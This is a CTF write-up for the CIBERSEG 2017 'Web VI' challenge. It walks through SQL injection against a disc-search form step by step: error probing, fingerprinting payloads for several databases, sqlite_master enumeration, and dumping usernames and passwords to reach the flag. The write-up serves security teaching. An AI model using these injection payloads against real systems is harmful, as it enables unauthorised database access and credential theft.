### ==================================================
### Web VI (175pts) write-up
### CTF: CIBERSEG 2017
### URL: https://ciberseg.uah.es/ctf.html
### CAT: web
### ==================================================

Alguien ha cometido un error al programar esta web.

http://retos.ciberseg.uah.es:81

o

http://yuki.ddom.me:81/


***

Somebody did a mistake while coding this web:

http://retos.ciberseg.uah.es:81

or

http://yuki.ddom.me:81/


***

## (1) RECONNAISSANCE

In order to perform the reconnaissance phase, we use Burp Suite as a proxy and Iceweasel as a browser in Kali Linux. We configure Iceweasel to use Burp as a proxy.

We perform a first request to the site and see that there is a form with only a field asking for the name of an artist. There seems to be a database running in the backend, which stores names of artists and disks.

Burp intercepts the request and the response, so we are able to analyze them:

REQUEST 1:

    GET / HTTP/1.1
    Host: retos.ciberseg.uah.es:81
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Connection: close
    Cache-Control: max-age=0

RESPONSE 1:

    X-Powered-By: Phusion Passenger 5.1.1
    Status: 200 OK
    Vary: Accept-Encoding
    Content-Length: 443
    Connection: close
    Content-Type: text/html; charset=utf-8
    
    <!doctype html>
    <title>Reto</title>
    <link rel=stylesheet type=text/css href="/static/style.css">
    <div class=page>
      <h1>Buscador de discos de mÃºsica por artista</h1>
      
       <form action="/lista">
           Artista:<br>
           <input type="text" name="name" value="Pink Floyd">
           <br>
           <input type="text" name="title" value="title" hidden="hidden"  readonly>
           <br>
           <button type="submit">Submit</button>
       </form>   
    </div>

We also see that the form has two entry points: a visible field 'name' and a hidden field 'title' (readonly).

Now we enter 'Pink Floyd' in the visible field, press the 'Submit' button and analyze the results in Burp.

REQUEST 2:

    GET /lista?name=Pink+Floyd&title=title HTTP/1.1
    Host: retos.ciberseg.uah.es:81
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://retos.ciberseg.uah.es:81/
    Connection: close

RESPONSE 2:

    HTTP/1.1 200 OK
    Date: Sun, 22 Jan 2017 10:33:00 GMT
    Server: Apache/2.4.18 (Ubuntu)
    X-Powered-By: Phusion Passenger 5.1.1
    Status: 200 OK
    Vary: Accept-Encoding
    Content-Length: 98
    Connection: close
    Content-Type: text/html; charset=utf-8

    <h1> Encontrados los siguientes discos: </h1>

    <li>Animals</li>

    <li>Dark Side of The Moon</li>

The response shows the names of two discs of Pink Floyd.

We see that the request includes both fields 'name' and 'title', so the sentence build in the backend database should be something like:

    SELECT title FROM <table> WHERE <name>=name

That is, 'title' seems to be the name of a column and 'name' the row of another column '\<name\>'. At this point, we have no connaissance of the real names of \<table\> and \<name\>.

Let's see what happens if we enter an artist not registered in the database:

REQUEST 3

    GET /lista?name=El+Canto+del+Loco&title=title HTTP/1.1
    Host: retos.ciberseg.uah.es:81
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://retos.ciberseg.uah.es:81/
    Connection: close

RESPONSE 3

    HTTP/1.1 200 OK
    Date: Sun, 22 Jan 2017 10:37:44 GMT
    Server: Apache/2.4.18 (Ubuntu)
    X-Powered-By: Phusion Passenger 5.1.1
    Content-Length: 48
    Status: 200 OK
    Connection: close
    Content-Type: text/html; charset=utf-8

    <h1> Encontrados los siguientes discos: </h1>

As expected, the application doesn't return any disc.

Now we are going to manipulate the parameters sent in 'name' and 'title'. In order to do this, we choose the Request#2 in the history of requests in Burp and send it to the 'Repeater' module, where we will be able to modify any parameter in the header of the request. This way, we can easily configure the values of 'name' and 'title' for each request.

I.e. now we configure 'title=pepito'. Although 'title' is a hidden field, we are able to manipulate it with Burp.

REQUEST 4

    GET /lista?name=Pink+Floyd&title=pepito HTTP/1.1
    Host: retos.ciberseg.uah.es:81
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:43.0) Gecko/20100101 Firefox/43.0 Iceweasel/43.0.4
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://retos.ciberseg.uah.es:81/
    Connection: close

RESPONSE 4

    HTTP/1.1 200 OK
    Date: Sun, 22 Jan 2017 10:40:38 GMT
    Server: Apache/2.4.18 (Ubuntu)
    X-Powered-By: Phusion Passenger 5.1.1
    Content-Length: 31
    Status: 200 OK
    Connection: close
    Content-Type: text/html; charset=utf-8
    
    <p>
    no such column: pepito
   </p>

We get an error message generated by the backend database, so we suspect that this field is vulnerable to SQL injection (SQLi).

Now we try SQLi against the field 'name'. This is what we see with several typical SQLi requests:

REQUEST 5 (name)

    Pink Floyd' or 1=1								

RESPONSE 5

    unrecognized token: "';"

REQUEST 6 (name)

    Pink Floyd' or 1=1;

RESPONSE 6
 
    You can only execute one statement at a time.

REQUEST 7 (name)

    Pink Floyd or '1'='1'

RESPONSE 7

    near "1": syntax error

This is a clear indication that 'name' is also vulnerable to SQLi.


## (2) IDENTIFICATION OF THE DBMS

Now we know that there is a backend database with two entry points (name, title) vulnerable to SQLi. The sentence build in the database once the form is submitted is:

    SELECT title FROM <table> WHERE <name>=name

We can inject 'UNION' statements in the 'name' field to try to identify the DBMS. There are typical requests in order to perform this enumeration:

REQUEST 8 (name) - try for MS-SQL

    Pink Floyd' union select 1,user_name(),3,4,5,6,7 --

RESPONSE 8 - it is not MS-SQL

    no such function: user_name

REQUEST 9 (name) - try for MySQL

    Pink Floyd' union select 1,user(),3,4,5,6,7	--

RESPONSE 9 - it is not MySQL

    no such function: user

REQUEST 10 (name) - Postgres SQL

    Pink Floyd' union select version() --

RESPONSE 10 - it is not Postgres SQL

    no such function: version

REQUEST 11 (name) - Informix

    Pink Floyd' union SELECT DBINFO('version', 'full') FROM systables WHERE tabid = 1

RESPONSE 11 - it is not Informix

    no such table: systables

REQUEST 12 (name) - Oracle

    Pink Floyd' union SELECT banner FROM v$version WHERE banner LIKE 'Oracle%' --

RESPONSE 12 - it is not Oracle

    no such table: v$version

REQUEST 13 (name) - Oracle (additional attempt)

    Pink Floyd' union SELECT version FROM v$instance --

RESPONSE 13 - It is not Oracle

    no such table: v$instance 

REQUEST 14 (name) - DB2

    Pink Floyd' union select versionnumber, version_timestamp from sysibm.sysversions --

RESPONSE 14 - It is not DB2

    no such table: sysibm.sysversions

REQUEST 15 (name) - Ingres

    Pink Floyd' union select dbmsinfo('_version');

RESPONSE 15 - It is not Ingres

    no such function: dbmsinfo

REQUEST 16 (name) - SQLite

    Pink Floyd' union SELECT tbl_name FROM sqlite_master --

This time we get a valid RESPONSE, so the DBMS is identified as SQLite.


## (3) DATABASE ENUMERATION

Now that we know that the DBMS is SQLite, we can use specific SQLite commands to try to enumerate the database.

First, we try to determine the **number of columns** of the current table:

REQUEST 17 (injection in 'name' and 'title' = *)

    Pink Floyd' union select NULL --

RESPONSE 17

    SELECTs to the left and right of UNION do not have the same number of result columns

The table must have more than one column.

REQUEST 18 (injection in 'name' and 'title' = *)

    Pink Floyd' union select NULL, NULL --

RESPONSE 18

    SELECTs to the left and right of UNION do not have the same number of result columns

The table must have more than two columns.

REQUEST 19 (injection in 'name' and 'title' = *)

    Pink Floyd' union select NULL, NULL, NULL --

This time we don't get any error message, so the table must have 3 columns. We can confirm that with an additional request:

REQUEST 20 (injection in 'name' and 'title' = *)

    Pink Floyd' order by 4 --

RESPONSE 20

    1st ORDER BY term out of range - should be between 1 and 3

Now, we try to **enumerate all the tables of the database**. Remember that we are using SQLite specific commands (not valid for other DBMS):

REQUEST 21 (injection in 'name' and 'title' = title)

    Pink Floyd' union SELECT tbl_name FROM sqlite_master --

RESPONSE 21

    <h1> Encontrados los siguientes discos: </h1>
    
    <li>Animals</li>
    <li>Dark Side of The Moon</li>
    <li>Discs</li>
    <li>Users</li>
    <li>sqlite_sequence</li>

We have dumped the names of 3 tables: Discs, Users and sqlite_sequence.

No we will try to **enumerate the columns of each table**. Again, using SQLite specific commands:

REQUEST 22 (injection in 'name' and 'title' = title)

    Pink Floyd' union SELECT sql FROM sqlite_master --

RESPONSE 22

    <h1> Encontrados los siguientes discos: </h1>
    
    <li>Animals</li>
    
    <li>CREATE TABLE &#34;Discs&#34; (
    	`title`	TEXT,
    	`author`	TEXT,
    	`id`	INTEGER PRIMARY KEY AUTOINCREMENT
    )</li>
    
    <li>CREATE TABLE `Users` (
    	`id`	INTEGER PRIMARY KEY AUTOINCREMENT,
    	`name`	TEXT,
    	`password`	TEXT
    )</li>
    
    <li>CREATE TABLE sqlite_sequence(name,seq)</li>
    
    <li>Dark Side of The Moon</li>

We have dumped the columns of all the tables. At a first glance, we are interested in the table 'Users'.


## (4) DATA EXTRACTION

We will try to extract the data from the table 'Users'. If we send the following request:

REQUEST 23 (injection in 'title')

    name,password FROM Users --

The sentence built in the backend should be:

SELECT name,password FROM Users -- FROM Discs WHERE author=name

The string on the right of '--' is interpreted as a comment and thus it is not executed. So we get:

RESPONSE 23

    <h1> Encontrados los siguientes discos: </h1>
    <li>Lannister</li>
    <li>Kuro</li>
    <li>Juan</li>

Now we build specific requests to get the password of each user:

REQUEST 24 (injection in 'title')

    password FROM Users WHERE name='Lannister' --

RESPONSE 24

    <h1> Encontrados los siguientes discos: </h1>
    <li>Charles</li>

REQUEST 25 (injection in 'title')

    password FROM Users WHERE name='Kuro' --

RESPONSE 25

    <h1> Encontrados los siguientes discos: </h1>
    <li>Pass</li>

REQUEST 26 (injection in 'title')

    password FROM Users WHERE name='Juan' --

RESPONSE 26

    <h1> Encontrados los siguientes discos: </h1>
    <li>flag{_congrats_you_have_sql_injection}</li>

So we finally get the flag:

    flag{_congrats_you_have_sql_injection}

## (5) USEFUL REFERENCES

http://pentestmonkey.net/category/cheat-sheet/sql-injection

http://resources.infosecinstitute.com/dumping-a-database-using-sql-injection/#gref

